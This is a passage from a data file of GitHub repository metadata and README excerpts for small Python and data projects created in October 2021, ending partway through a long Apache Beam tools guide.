públicado en ""How Other Nations Pay for Child Care. The U.S. Is an Outlier"" (The New York Times)   Se muestra y reproduce el stacked area chart en python 🐍  públicado en ""How Severe Is the Western Drought? See For Yourself"" (The New York Times)     Off the Charts: How we use colour in our chart design (The Economist newsletter del equipo de visualización). En la presentación hay 3 visualizaciones de ejemplos mencionados en esta edición del newsletter   "
417216982;Programmazione-Tor-Vergata-21-22;https://github.com/lyzcoote/Programmazione-Tor-Vergata-21-22;Python;2021-10-14T17:07:22Z;0;0;0;
417309306;pyRISMAT;https://github.com/PDWest/pyRISMAT;;2021-10-14T23:19:34Z;0;0;0;Welcome to the pyRISMAT project Our goal is to port William Sharpe's RISMAT retirement income analysis package from its original Matlab language to python.  Those not familiar with that work are directed to the source:  https://web.stanford.edu/~wfsharpe/RISMAT/ Initially we seek only to achieve parity between the original Matlab RISMAT and pyRISMAT, but are entertaining possible future enhancements to include:  improved graphics inclusion of the impact of income tax restructured directories to separate code, common data, clients and scenarios possibly some sort of a GUI interface  The original Matlab code will be modified to only to ensure enduring compatibility with the always evolving Matlab environment, bugfixes (if any), and a small modification to save validation data sets from the original code. Note that we are maintaining two branches:  mlMain--a branch with the original code main--the main development branch with the python code  It is envisioned that most users will be interested only in the code on main 
417284161;AiogramBotWithSanic;https://github.com/threebaddots/AiogramBotWithSanic;Python;2021-10-14T21:14:06Z;0;0;0;AiogramBotWithSanic test task #3 from asmgen. A simple bot for telegram that waits for geolocation from the user and saves it in the database + it is possible to get geolocation from the site by specifying the id, using sanic. 
417311541;investment-fund-builder;https://github.com/simprecicchiani/investment-fund-builder;Jupyter Notebook;2021-10-14T23:32:21Z;0;0;0;Investment Fund Builder First sketch for a simple, free and accessible investment fund builder. Features   Rebalancing  Equal or custom weighted  To Do   Accumulating / distributing  Capitalization weighted  
417290753;taxi_ride_analysis;https://github.com/Lang-Jonathan/taxi_ride_analysis;Jupyter Notebook;2021-10-14T21:45:10Z;0;0;0;Taxi Ride Analysis Project Description In this project a in depth analysis has been carried out for a fictive new ride-share company named Zuber which is launching in Chicago. To find patterns and preferences in the passengers behaviour and the impact of external factors the company provided data in a database containing info on taxi rides in Chicago. Data aggregation In order to select and use the necessary data a SQL query has been developed and executed. Additional to the provided data, the weather data of given time period has been scraped. To enable an in-depth understanding of the cab rides and the high variance in rides per company the public available datasets for medallion owners in Chicago has been downloaded via the API on the website of the city. Conclusion The following steps have been performed within the project:  Data mining, aggregation and merging Data preprocessing Extensive Exploratory Data Analysis  Observations within the project:  There are two different types of cab drivers: affiliations and independent drivers. The percentage of surrendered independent cab drivers since 2017 is pretty high. Therefore the Zuber needs to pay attention to bind their drivers pretty well The amount of rides to the city centre is significant higher than to the outer districts The weather does not influence the routes from the city center to the airport drastically, but for the rest of the destinations, the weather has an impact. (bad weather leads to an increase in rides) The duration of the trips from the airport to the city centre differs. This can be explained by the general increased use of cars due to bad weather and consequentially fuller streets.  
417206315;NSE_Sectorial_IndicesDB;https://github.com/pillai-amal/NSE_Sectorial_IndicesDB;Python;2021-10-14T16:34:19Z;0;0;0;NSE_Sectorial_IndicesDB This is a python script to make a sqlite database for your projects from csv files downloaded form NSE website. Requirements: Python3.8+ sqlite3 
417266320;MyFirstGame;https://github.com/VakuTheDaku/MyFirstGame;HTML;2021-10-14T20:01:00Z;0;0;0;MyFirstGame A game i created by watching TechWithTim youtube channel using python.( i have added buttons and new features too) 
417312839;coursera-project;https://github.com/ryangfernandez/coursera-project;Python;2021-10-14T23:39:45Z;0;0;0;
417314795;dga-ckanext-zippreview;https://github.com/AusDTO/dga-ckanext-zippreview;Python;2021-10-14T23:51:06Z;0;0;0;ckanext-zippreview Preview contents of ZIP files, even if they are hosted on external sites!  Requirements CKAN 2.3+ (Resource view support)  Installation To install ckanext-zippreview:  Activate your CKAN virtual environment, for example: . /usr/lib/ckan/default/bin/activate   Install the ckanext-zippreview Python package into your virtual environment: pip install ckanext-zippreview   Add zip_view to the ckan.plugins setting and ckan.views.default_views setting in your CKAN config file (by default the config file is located at /etc/ckan/default/production.ini).  Restart CKAN. For example if you've deployed CKAN with Apache on Ubuntu: sudo service apache2 reload     Development Installation To install ckanext-zippreview for development, activate your CKAN virtualenv and do: git clone https://github.com/datagovau/ckanext-zippreview.git cd ckanext-zippreview python setup.py develop pip install -r dev-requirements.txt  
417211783;Crop-Recommendation-System;https://github.com/Pranayh/Crop-Recommendation-System;Python;2021-10-14T16:51:45Z;0;0;0;
417268326;customer_segmentation_package;https://github.com/rbuerki/customer_segmentation_package;;2021-10-14T20:08:38Z;0;0;0;"xxx Segments This is a python package designed for the monthly calculation / update of the different segmentation models for xxx loyalty members:  RFM scorings and segment calculation Affinties clustering Lifecycle segmentation  The aim of the package is to perform all of these calculations in one run and based on the same source data so that there are no inconsistencies resulting from different data loads, source tables etc. The results are written to a local CSV file and to a table in the analytics DB. Build This package requires Python 3.6 or higher. It runs in the ""xxx_segments"" conda environment which can be installed according to the env.yml file. (It is worth to note that sk-learn has been fixed to version 0.21.2 because of a pickled clustering model that was developed with this version.) Run In a terminal or command window, navigate to the top-level project directory (the one that contains this README). Launch with: python xxx_segments To speed up the process during development and testing two CLI options can be passed to the run command:  -p / --preloaded : Skips the stored procedure execution for loading the transaction data and thus fetches preloaded transaction data from the analytics DB. This is handy if you make changes to the code only. -n / --nowriteback : Skips the final insertion of the results into the database. They are still stored to a CSV file tough. This allows for experimentation without overwriting existing results.  Output The script results in a pandas DataFrame consisting of a row for every xxx loyalty member (identified by MemberAK and MemberSK) with the different metrics and segment scorings. These are:    ""yearmon"" ""MemberAK"" ""MemberSK"" ""recency"" ""frequency"" ""monetary"" ""RFM-Score"" ""RFM_3"" ""RFM_Segment"" ""Affinität_Segment"" ""Lifecycle_Segment"" ""R"" ""F"" ""M""     ... ... ... ... ... ... ... ... ... ... ... ... ... ...     yearmon A 4 digit int (yymm) indicating the final month of the period the actual results were updated for.* recency: Number of days since last purchase (up to 3 years back) frequency: Number of days with a transaction within the last 1 year monetary: Sum of turnover within last 2 years rfm_score: 3 digit RFM-Score according to ""PKZ-Logic"" rfm_3: ""Classic"" 3 digit RFM-Score consisting of concatentated R-F-M quantile classifications rfm_segment: RFM-segment classification (based on ""rfm_3"") cluster_name: Segment classification based on products purchased lifecycle_segment: Segment classification on temporal components and frequencies  *The reference date / end date for all calculations is always the last day of the last full month for which transaction data has been loaded. Upsert / Merge into DB These results are merged into a DB-table containing the results of all past runs / months. The yearmon column together with the MemberAK form a composite primary key. See the table create statement for the details and exact column structure: CREATE TABLE xxx_analytics.dbo.xxx_segments_hist (   yearmon smallint,   MemberAK int,   MemberSK int NOT NULL,   recency smallint,   frequency smallint,   monetary money,   R tinyint,   F tinyint,   M tinyint,   RFM-Score smallint,   RFM_3 smallint,   RFM_Segment nvarchar(30),   Affnität_Segment nvarchar(40),   Lifecycle_Segment nvarchar(30),   PRIMARY KEY (yearmon, MemberAK) ) The merge logic is as follows:  INSERT rows if the primary key does not yet exist (appends results for the first run of a new month to the table) UPDATE row entries if the primary key already exists (for example if you rerun the script for a given month, it updates the scores that have changed)  Backfills: This logic makes it possible to ""backfill"" results for earlier periods by running the script with past transaction data. But one has to be aware that the loyality member pool and the contents of the helper tables in the analytics DB (on Warengruppen and Sites) will be loaded with actual values. (This means for example that more recently created members will be considered for modelling and will be classified as ""lost inactive"" for earlier periods.) (Actual work-around for backfills: Use the stored procedure ""manual date"" and set the dates manually in the transaction query.) Save ""Export-File"" to CSV A subset of the result columns is also written to a CSV file in the local data/EXPORT/ folder (or whatever SAVE_PATH is defined in the settings.py). The file name includes a 4-digit yearmon code and a timestamp. These files are meant for iLoy to import the CRM-scores into the PROD DB. This CSV has the following columns:    ""MemberAK"" ""MemberSK"" ""R"" ""F"" ""M"" ""RFM-Score"" ""RFM_3"" ""RFM_Segment"" ""Affinität_Segment"" ""Lifecycle_Segment""     ... ... ... ... ... ... ... ... ... ...    [THE REST OF THIS README IS NOT DISCLOSED] "
417277557;MCC-discord-bot;https://github.com/BizarrePenguin/MCC-discord-bot;Python;2021-10-14T20:46:55Z;0;0;0;"Minecraft-Console-Client ↔ Discord This little project is a discord bot written in python that acts as an interface for one or multiple instances of minecraft console client, which is abbreviated ""MCC"". Basically this bot should be installed on a host machine with the MCC installed, so all members of the discord server where the bot is invited to, have an easy and safe access to a preconfigured MCC. This can be used mainly for a convenient method of AFK support without much technical knowledge of the server members that want to AFK without leaving their personal computers on. "
417225008;NetSlurper;https://github.com/struppigel/NetSlurper;Python;2021-10-14T17:33:29Z;0;0;0;"NetSlurper Python toolkit for easy extraction of signature patterns from certain not so obvious parts of .NET assemblies So far it only contains one tool: dotnet_typesig2yara.py This tool creates a Yara rule containing a method's type signature. It needs the fully qualified name for a method in a .NET file as well as the file itself. Prerequisite: Put ildasm.exe in PATH variable Usage: dotnet_typesig2yara.py ""foo.bar::Baz"" sample.exe "
417269331;checkSentinelGee;https://github.com/fitoprincipe/checkSentinelGee;Python;2021-10-14T20:12:44Z;0;0;0;"GEE Sentinel Checker Check if Google Earth Engine (GEE) is missing a Sentinel image by calling the Copernicus Open Hub API. This is a Flask (python) application that you can deploy or run locally. The query parameters are:  coords: the coordinates of the polygon to check. Must be the coordinates of a simple rectangle. Must be a string as follows: ""lat lon lat lon..."" start: the start date (inclusive). Format: yyyyMMdd end: the end date (exclusive). Format: yyyyMMdd ingee: the ids list of the images available on GEE taken from ""PRODUCT_ID"" property of the images. Must be a string as follows: ""id1 id2 id3..."" level: the processing level of the images (options: 'toa', 'sr')  The file code_editor.js contains an example on how to use this web app. Usage Alternative 1 (without python) Avoid the python part and use the already running endpoint. It is running on Heroku so it has its limitations. In the code editor var checker = require('users/fitoprincipe/s2checker:main')  // Local endpoint. Uncomment this line if the server is running locally //var endpoint = 'http://127.0.0.1:5000/check'; var endpoint = null;  var level = 'toa' // or 'sr' var start = '2021-09-15' var end = '2021-09-21' var check = new checker.Checker(geometry, level, start, end, endpoint);  print(ui.Label('CHECK', null, check.url())) If you hit an error that says:  Application error: An error occurred in the application and your page could not be served. If you are the application owner, check your logs for details. You can do this from the Heroku CLI with the command  is because you are asking too much, to solve it decrease the area of the geometry or the time window. Alternative 2 (with python) If you run the server locally you can fetch more data, so you won't hit the Application error. Also, you can modify the code to your needs and even contribute to this project to make it better for everyone. Steps:  Clone this repository Create a virtual environment (for example: s2checker) Activate the environment Navigate to the repository folder Install dependencies:  pip install -r requirements.txt   Create a new file in the repo folder called .env (text file) Add the following to that file:  FLASK_ENV=development HUB_USER=your_copernicus_hub_user HUB_PASS=your_copernicus_hub_password   Run the server:  flask run   The server is running, now you can uncomment the endpoint line in the code editor code  "
417276994;PyMail;https://github.com/frederikblais/PyMail;Python;2021-10-14T20:44:32Z;0;0;0;PyMail This is a repository for PyMail, a python app that can send emails directly for your terminal. 
417257388;cheatsheets;https://github.com/VincentSheehan22/cheatsheets;;2021-10-14T19:26:14Z;0;0;0;cheatsheets Syntax cheatsheets for languages and tools I'm using.  Markdown Python Regex HTML CSS JavaScript SVG  
417259682;ljweweb-flask-backend;https://github.com/leowotzak/ljweweb-flask-backend;Python;2021-10-14T19:35:09Z;0;0;0;
417293012;Apache-Beam-Guide;https://github.com/mikeroyal/Apache-Beam-Guide;;2021-10-14T21:55:58Z;1;1;0;"     Apache Beam Guide  A guide covering Apache Beam including the applications, libraries and tools that will make you better and more efficient with Apache Beam development. Note: You can easily convert this markdown file to a PDF in VSCode using this handy extension Markdown PDF.      How Beam Runs on Top of Flink. Source: Apache Flink™ Table of Contents   Apache Beam Learning Resources   Apache Beam Tools, Libraries, and Frameworks   Kubernetes   Docker   Machine Learning   Algorithms   Deep Learning Development   Reinforcement Learning Development   Computer Vision Development   Natural Language Processing (NLP) Development   Bioinformatics   Databases   CUDA Development   MATLAB Development   Java Development   C/C++ Development   C# Development   Python Development   Go Development   Scala Development   R Development   Apache Beam Learning Resources Back to the Top Apache Beam is an open source, unified model and set of language-specific SDKs for defining and executing data processing workflows, and also data ingestion and integration flows, supporting Enterprise Integration Patterns (EIPs) and Domain Specific Languages (DSLs). Apache Beam Documentation Apache Beam Developer Resources Runners for Apache Beam Beam Quickstart for Python | Apache Beam Beam Quickstart for Java | Apache Beam Apache Beam | A Hands-On course to build Big data Pipelines | Udemy Apache Beam | Hands on course for Big Data Pipeline with Python | Udemy Apache Beam - Pipeline orchestration with TFX | Coursera Designing streaming pipelines with Apache Beam | Coursera Exploring the Apache Beam SDK for Modeling Streaming Data for Processing | Pluralsight Apache Beam Basics training course | Whizlabs Apache Beam Training Courses | NobleProg Getting Started with Apache Flink®  Apache Flink®  Documentation Apache Flink® Wiki Apache Flink®  Training Course | Apache Flink® Apache Flink®  Community Streaming ETL with Apache Flink and Amazon Kinesis Data Analytics | AWS Certified Apache Flink Training Course | DataFlair Apache Flink vs Apache Spark | DataFlair Cloudera Streaming Analytics: Using Apache Flink and SQL Stream Builder on CDP Apache Flink | A Real Time & Hands-On course on Flink | Udemy Getting Started with Apache Flink | Udemy Exploring the Apache Flink API for Processing Streaming Data | Pluralsight Processing Streaming Data Using Apache Flink | Pluralsight Apache Flink: Data Processing Technology | Pluralsight Apache Spark Quick Start What is Apache Spark? | IBM Introduction to Apache Spark and Analytics | AWS Apache Spark 3.0: For Analytics & Machine Learning | NVIDIA .NET for Apache Spark™ | Big data analytics Apache Spark Basics | MATLAB & Simulink MATLAB Hadoop and Spark | MATLAB & Simulink Top Apache Spark Courses Online | Coursera Top Apache Spark Courses Online | Udemy Apache Spark In-Depth (Spark with Scala) | Udemy Learn Apache Spark with Online Courses | edX Apache Spark Essential Training Online Class | LinkedIn Learning Cloudera Developer Training for Apache Spark™ and Hadoop | Cloudera Databricks Certified Associate Developer for Apache Spark 3.0 certification | Databricks Apache Spark Training Courses | NobleProg Apache Beam Tools, Libraries, and Frameworks Back to the Top Apache Flink™ is a framework and distributed processing engine for stateful computations over unbounded and bounded data streams. Flink has been designed to run in all common cluster environments, perform computations at in-memory speed and at any scale. Google Cloud Dataflow is a managed service for executing a wide variety of data processing patterns with Google Cloud. Google Cloud BigQuery is a serverless, highly scalable, and cost-effective multicloud data warehouse designed for business agility. Apache Flume is a distributed, reliable, and available service for efficiently collecting, aggregating, and moving large amounts of streaming event data. Apache Mesos is a cluster manager that provides efficient resource isolation and sharing across distributed applications, or frameworks. It can run Hadoop, Jenkins, Spark, Aurora, and other frameworks on a dynamically shared pool of nodes. Apache Kafka® is a distributed data store optimized for ingesting and processing streaming data in real-time. Streaming data is data that is continuously generated by thousands of data sources, which typically send the data records in simultaneously. Apache Spark™ is a unified analytics engine for large-scale data processing. It provides high-level APIs in Scala, Java, Python, and R, and an optimized engine that supports general computation graphs for data analysis. It also supports a rich set of higher-level tools including Spark SQL for SQL and DataFrames, MLlib for machine learning, GraphX for graph processing, and Structured Streaming for stream processing. Spark SQL is a Spark module for structured data processing. Unlike the basic Spark RDD API, the interfaces provided by Spark SQL provide Spark with more information about the structure of both the data and the computation being performed. Internally, Spark SQL uses this extra information to perform extra optimizations. Spark Streaming is a scalable and fault-tolerant stream processing engine built on the Spark SQL engine. It can express your streaming computation the same way you would express a batch computation on static data from various sources including Apache Kafka, Apache Flume, and Amazon Kinesis. Apache HBase™ is an open-source, NoSQL, distributed big data store. It enables random, strictly consistent, real-time access to petabytes of data. HBase is very effective for handling large, sparse datasets. HBase serves as a direct input and output to the Apache MapReduce framework for Hadoop, and works with Apache Phoenix to enable SQL-like queries over HBase tables. Hadoop Distributed File System (HDFS) is a distributed file system that handles large data sets running on commodity hardware. It is used to scale a single Apache Hadoop cluster to hundreds (and even thousands) of nodes. HDFS is one of the major components of Apache Hadoop, the others being MapReduce and YARN. Apache PredictionIO is an open source machine learning framework for developers, data scientists, and end users. It supports event collection, deployment of algorithms, evaluation, querying predictive results via REST APIs. It is based on scalable open source services like Hadoop, HBase (and other DBs), Elasticsearch, Spark and implements what is called a Lambda Architecture. Apache Airflow is an open-source workflow management platform created by the community to programmatically author, schedule and monitor workflows. Airflow has a modular architecture and uses a message queue to orchestrate an arbitrary number of workers. Airflow is ready to scale to infinity. Apache Samza is a distributed stream processing framework that allows you to build stateful applications that process data in real-time from multiple sources including Apache Kafka. Battle-tested at scale, it supports flexible deployment options to run on YARN or as a standalone library. Apache Arrow is a language-independent columnar memory format for flat and hierarchical data, organized for efficient analytic operations on modern hardware like CPUs and GPUs. Languages that have Arrow libraries (under development) include C, C++, Go, Java, JavaScript, Python, Ruby and Rust. Confluent Platform is a full-scale data streaming platform that enables you to easily access, store, and manage data as continuous, real-time streams. Built by the original creators of Apache Kafka®, Confluent expands the benefits of Kafka with enterprise-grade features while removing the burden of Kafka management or monitoring. Kafka Connec is an open source Apache Kafka framework for connecting Kafka with external systems such as databases, key-value stores, search indexes, and file systems. IBM Streams is a stream processing framework with Kafka source and sink to consume and produce Kafka messages. KaBoom is a high-performance HDFS data loader. Azkarra Streams is a lightweight java framework to make it easy to build and manage streaming microservices based on Kafka Streams. uReplicator is a tool that provides the ability to replicate across Kafka clusters in other data centers. Mirus is a tool for distributed, high-volume replication between Apache Kafka clusters based on Kafka Connect. Kafka Manager is a tool for managing Apache Kafka. Kafkat is a simplified command-line administration for Kafka brokers. Kafka Web Console is a tool that displays information about your Kafka cluster including which nodes are up and what topics they host data for. Kafka Offset Monitor is a tool that displays the state of all consumers and how far behind the head of the stream they are. Capillary is a tool that displays the state and deltas of Kafka-based Apache Storm topologies. Doctor Kafka is a service for cluster auto healing and workload balancing. Cruise Control is a tool that fully automate the dynamic workload rebalance and self-healing of a Kafka cluster. Burrow is a monitoring tool that provides consumer lag checking as a service without the need for specifying thresholds. Chaperone is an audit system that monitors the completeness and latency of data stream. Sematext is an integration tool for Kafka monitoring that collects and charts 200+ Kafka metrics. Cloudera is the big data software platform of choice across numerous industries, providing customers with components like Hadoop, Spark, and Hive. Splunk is a software platform that is used for searching, monitoring, and examining machine-generated Big Data through a web interface. MLib is Spark’s machine learning (ML) library. Its goal is to make practical machine learning scalable and easy. It consists of common learning algorithms and utilities, including classification, regression, clustering, collaborative filtering, dimensionality reduction, as well as lower-level optimization primitives and higher-level pipeline APIs. Graphx is the new Spark API for graphs and graph-parallel computation. At a high-level, GraphX extends the Spark RDD by introducing the Resilient Distributed Property Graph: a directed multigraph with properties attached to each vertex and edge. PySpark is an interface for Apache Spark in Python. It not only allows you to write Spark applications using Python APIs, but also provides the PySpark shell for interactively analyzing your data in a distributed environment. Apache Spark Connector for SQL Server and Azure SQL is a high-performance connector that enables you to use transactional data in big data analytics and persists results for ad-hoc queries or reporting. The connector allows you to use any SQL database, on-premises or in the cloud, as an input data source or output data sink for Spark jobs. Apache Cassandra™ is an open source NoSQL distributed database trusted by thousands of companies for scalability and high availability without compromising performance. Cassandra provides linear scalability and proven fault-tolerance on commodity hardware or cloud infrastructure make it the perfect platform for mission-critical data. Aiven for Apache Cassandra is a fully managed NoSQL database, deployable in the cloud of your choice. Snap it into your existing workflows with the click of a button, automate away the mundane tasks, and focus on building your core apps. Amazon Keyspaces (for Apache Cassandra) is a scalable, highly available, and managed Apache Cassandra–compatible database service. Azure Managed Instance for Apache Cassandra is a service offering moderate management, elasticity, and instance-based pricing for Cassandra data. Go beyond traditional lift and shift by expanding your Cassandra workloads to the cloud and keep control over what matters to you. DataStax Astra is a cloud-native, serverless database as-a-service built on Apache Cassandra™, complete with a free-tier and CQL, REST, schemaless JSON Document and GraphQL APIs in addition to language drivers for faster development. It also features an improved secondary index implementation called storage attached indexing (SAI) where you can search/filter on non-primary key columns. Astra is available on AWS, Azure and Google Cloud. Elassandra is an Apache Cassandra distribution including an Elasticsearch search engine. Elassandra is a multi-master multi-cloud database and search engine with support for replicating across multiple datacenters in active/active mode. Instaclustr Hosted & Managed Apache Cassandra as a Service is a fully managed and SOC 2 certified hosted & managed service for Apache Cassandra® on AWS, Azure, GCP and IBM Cloud. Adelphi is an automation tool for testing open-source Cassandra using cassandra-diff, nosqlbench, and fqltool. Ansible Cassandra Collection is a collection tools that provides all Ansible modules allowing to interact with Apache Cassandra. Link to GitHub repo. Apache Ignite® is a distributed database for high-performance computing with in-memory speed. Ignite's main goal is to provide performance and scalability by partitioning and distributing data within a cluster. The cluster provides very fast data processing. Azure-Samples/Cassandra Proxy is a proxy handles client connections and forwards them to two Cassandra clusters simultaneously. Cassandra.link is a curated site with tools, along with cassandra.tools. Cassandra Lucene Index is a plugin for Apache Cassandra that extends its index functionality to provide near real time search such as ElasticSearch or Solr, including full text search capabilities and free multivariable, geospatial and bitemporal search. Cassandra Migration is a simple and lightweight Apache Cassandra database schema migration tool. Cassandra Prometheus Exporter is a standalone application which exports Cassandra metrics through a prometheus friendly endpoint. DataStax Bulk Loader is an easy-to-use command line utility for loading and unloading JSON or CSV files to/from the database, counting rows in tables and identifying large partitions. DataStax Metrics Collector for Cassandra is a tool Based on Collectd, that aggregates OS and Cassandra metrics along with diagnostic events to facilitate problem resolution and remediation DOSA is a storage framework that provides a declarative object storage abstraction for applications in Golang and (soon) Java. Dropwizard-Cassandra is a dropwizard-cassandra library provides useful functionality for Dropwizard apps that communicate with Cassandra clusters. EmoDB is a RESTful HTTP data store built on top of Cassandra that stores schemaless JSON objects and offers a databus that allows subscribers to watch for changes to those events. It’s designed to span multiple data centers and features massive non-blocking writes and no synchronous cross data center communication. FiloDB is a distributed, Prometheus-compatible, real-time, in-memory, massively scalable, multi-schema time series/event/operational database. Gocql is a software package that implements a fast and robust Cassandra client for the Go programming language. Grafana Cassandra Source is a Apache Cassandra Datasource for Grafana. This datasource is to visualise time-series data stored in Cassandra/DSE. Hackolade is a visual data modeling tool for Cassandra. Hazelcast Cassandra is a sample implementation of Hazelcast MapStore with DSE Cassandra using DSE Object Mapper. Instaclustr Esop is the Swiss knife for backup and restore of your node to GCP, Azure, S3, Ceph etc. Supports backup and restoration of commit logs too. Esop is embedded in Instaclustr Icarus sidecar so you may backup and restore your cluster remotely and on-the-fly without any disruption. Instaclustr Exporter is a Java agent that exports Cassandra metrics to Prometheus. Instaclustr Go Client for Instaclustr Icarus is a Go client for Instaclustr Icarus sidecar. Instaclustr Kerberos plugin is a GSSAPI authentication provider for Apache Cassandra. Instaclustr Java Driver for Kerberos is a GSSAPI authentication provider for the Cassandra Java driver. Instaclustr LDAP Authenticator is a LDAP Authenticator for Apache Cassandra. Instaclustr Minotaur is a Command line tool for consistent rebuilding of a Cassandra cluster. Instaclustr SSTable Generator is a CLI tool for programmatic generation of Cassandra SSTables. Instaclustr SSTable Tools is a  command line tool that helps admins get summaries, metadata, partition info, and cell info for SSTables. Instaclustr TTL Remover is a Command line tool for rewriting SSTables to remove TTLs. JanusGraph is a highly scalable graph database optimized for storing and querying large graphs with billions of vertices and edges distributed across a multi-machine cluster. KairosDB is a fast distributed scalable time series database written on top of Cassandra. Kong is a cloud-native, fast, scalable, and distributed Microservice Abstraction Layer. The Last Pickle Cassandra stress tool is a workload-centric stress tool for Apache Cassandra. Designed for simplicity, no math degree required. (DataStax). The Last Pickle Medusa is an Apache Cassandra Backup and Restore Tool (DataStax). The Last Pickle Reaper is an automated repair tool for Apache Cassandra (DataStax). Netflix Data Explorer is a tool that allows users to explore data stored in several popular datastores. NoSQLBench is a pluggable benchmarking suite for Cassandra and other distributed systems. OpenNMS is the world’s first enterprise grade network management application platform developed under the open source model. Phantom is an underlying engine of all other drivers. Phantom, Quill, and the Spark connector all use it underneath the hood to connect and execute queries. Quill is a tool that provides a Quoted Domain Specific Language (QDSL) to express queries in Scala and execute them in a target language. Rebar is a ulti-tenant SaaS boilerplate + examples for universal web application with React, Material-UI, Relay, GraphQL, JWT, Node.js, C* DB - Cassandra/Elassandra/Scylla. Stargate is an pen source data gateway providing CQL, Schemaless JSON Document, REST, and GraphQL APIs for Apache Cassandra. Stratio Cassandra Lucene Index is a plugin for Apache Cassandra that extends its index functionality to provide near real time search such as ElasticSearch or Solr, including full text search capabilities and free multivariable, geospatial and bitemporal search. Strongbox is an OpenSource artifact repository manager written in Java. Temporal is a microservice orchestration platform which enables developers to build scalable applications without sacrificing productivity or reliability. Trellis LDP is an enterprise-ready linked data server built on existing Web standards that is modular, extensible and fast. Wasabi is an A/B Testing Service is a real-time, enterprise-grade, 100% API driven project. D2iQ Cassandra Kudo Operator is the KUDO Cassandra Operator makes it easy to deploy and manage Apache Cassandra on Kubernetes. DataStax Cassandra operator is a tool that manages DataStax Kubernetes Operator for Apache Cassandra. Instaclustr Cassandra operator is a tool that manages Cassandra clusters deployed to Kubernetes and automates tasks related to operating a Cassandra cluster. K8ssandra is a tool that provides a production-ready platform for running Apache Cassandra on Kubernetes, including automation for operational tasks such as installation via helm, repairs, backups, and monitoring. K8ssandra includes the DataStax Cassandra operator. Orange Cassandra operator is a Kubernetes operator to automate provisioning, management, autoscaling and operations of Apache Cassandra clusters deployed to K8s. Rook is an open source cloud-native storage orchestrator for Kubernetes, providing the platform, framework, and support for a diverse set of storage solutions to natively integrate with cloud-native environments. Sky Cassandra Operator is a Kubernetes operator that manages Cassandra clusters inside Kubernetes. Apache Cassandra cassandra-sidecar is a sidecar for the highly scalable Apache Cassandra database, built as part of the Apache Cassandra project. DataStax Management API for Apache Cassandra is a RESTful / Secure Management Sidecar for Apache Cassandra. Apache Camel is an Open Source integration framework that empowers you to quickly and easily integrate various systems consuming or producing data. Django Cassandra Engine is a Cassandra backend for Django Framework that allows you to use Cqlengine directly in your project. Express Cassandra is a Cassandra ORM/ODM/OGM for NodeJS with Elassandra & JanusGraph Support. Marmaray is a generic Hadoop data ingestion and dispersal framework and library. It is a plug-in based framework built on top of the Hadoop ecosystem where support can be added to ingest data from any source and disperse to any sink leveraging the power of Apache Spark. Micronaut Cassandra isa tool that adds support for the DataStax Cassandra Driver to a Micronaut application. Quarkus extension for Apache Cassandra is an Apache Cassandra® extension for Quarkus. Quarkus is A Kubernetes Native Java stack tailored for OpenJDK HotSpot and GraalVM, crafted from the best of breed Java libraries and standards. Stream Framework is a Python library which allows you to build activity streams & newsfeeds using Cassandra and/or Redis. Testcontainers is a Java library that supports JUnit tests, providing lightweight, throwaway instances of common databases, Selenium web browsers, or anything else that can run in a Docker container. Cassandra Storage Plugin is Apache Drill’s Cassandra storage plugin that allows you to execute SQL queries against Cassandra tables. Flink Sink Connector is a connector thatprovides sinks that writes data into a Apache Cassandra database. Confluent Connect Cassandra is the Confluent Cassandra Sink Connector is used to move messages from Kafka into Apache Cassandra. DataStax Sink Connector is the DataStax Apache Kafka Connector automatically takes records from Kafka topics and writes them to a DataStax Enterprise or Apache Cassandra™ database. This sink connector is deployed in the Kafka Connect framework and removes the need to build a custom solution to move data between these two systems. Lenses Sink Connector is the Cassandra Sink allows you to write events from Kafka to Cassandra. The connector converts the value from the Kafka Connect SinkRecords to JSON and uses Cassandra’s JSON insert functionality to insert the rows. The task expects pre-created tables in Cassandra. Pulsar Sink Connector Cassandra Connector is the Pulsar Cassandra Sink connector is used to write messages to a Cassandra Cluster. DataStax Spark Cassandra Connector is a library  that lets you expose Cassandra tables as Spark RDDs and Datasets/DataFrames, write Spark RDDs and Datasets/DataFrames to Cassandra tables, and execute arbitrary CQL queries in your Spark applications. Presto is an Cassandra connector allows querying data stored in Cassandra. Docker community Cassandra images is a collection of Docker images for Apache Cassandra maintained by the Docker community. DataStax Desktop is a cross-platform (Windows, MacOSX, Linux) application that allows developers to quickly explore Apache Cassandra™ with a few clicks on their laptop, complete with tutorials and walkthroughs. Tlp-cluster is a tool for launching Cassandra clusters in AWS (DataStax). Elasticsearch is a distributed, RESTful search and analytics engine capable of addressing a growing number of use cases. As the heart of the Elastic Stack, it centrally stores your data for lightning fast search, fine‑tuned relevancy, and powerful analytics that scale with ease. Apache Parquet is a columnar storage format available to any project in the Hadoop ecosystem, regardless of the choice of data processing framework, data model or programming language. DataFusion is an extensible query execution framework, written in Rust, that uses Apache Arrow as its in-memory format. DataFusion supports both an SQL and a DataFrame API for building logical query plans as well as a query optimizer and execution engine capable of parallel execution against partitioned data sources (CSV and Parquet) using threads. Fletcher is a framework that helps to integrate FPGA accelerators with tools and frameworks that use Apache Arrow in their back-ends. Azure Databricks is a fast and collaborative Apache Spark-based big data analytics service designed for data science and data engineering. Azure Databricks, sets up your Apache Spark environment in minutes, autoscale, and collaborate on shared projects in an interactive workspace. Azure Databricks supports Python, Scala, R, Java, and SQL, as well as data science frameworks and libraries including TensorFlow, PyTorch, and scikit-learn. Koalas is a project that makes data scientists more productive when interacting with big data, by implementing the pandas DataFrame API on top of Apache Spark. MLflowis a platform to streamline machine learning development, including tracking experiments, packaging code into reproducible runs, and sharing and deploying models. It offers a set of lightweight APIs that can be used with any existing machine learning application or library (TensorFlow, PyTorch, XGBoost, etc), wherever you currently run ML code (notebooks, standalone applications or the cloud). MLflow has four main components:  The Tracking component that allows you to record machine model training sessions (called runs) and run           queries using Java, Python, R, and REST APIs. The Projects component packages code that is used in data science projects to ensure it can easily be reused and experiments can be reproduced. The Models component that provides a standard unit for packaging and reusing machine learning models. The Model Registry component that lets you centrally manage models and their lifecycle.  Cluster Manager for Apache Kafka(CMAK) is a tool for managing Apache Kafka clusters. BigDL is a distributed deep learning library for Apache Spark. With BigDL, users can write their deep learning applications as standard Spark programs, which can directly run on top of existing Spark or Hadoop clusters. Jupyter Notebook is an open-source web application that allows you to create and share documents that contain live code, equations, visualizations and narrative text. Jupyter is used widely in industries that do data cleaning and transformation, numerical simulation, statistical modeling, data visualization, data science, and machine learning. Dask is an open source tool that provides advanced parallelism for analytics, enabling performance at scale for the tools you love. It is developed in coordination with other community projects like NumPy, pandas, and scikit-learn. Dask DataFrame is a large parallel DataFrame composed of many smaller Pandas DataFrames, split along the index. These Pandas DataFrames may live on disk for 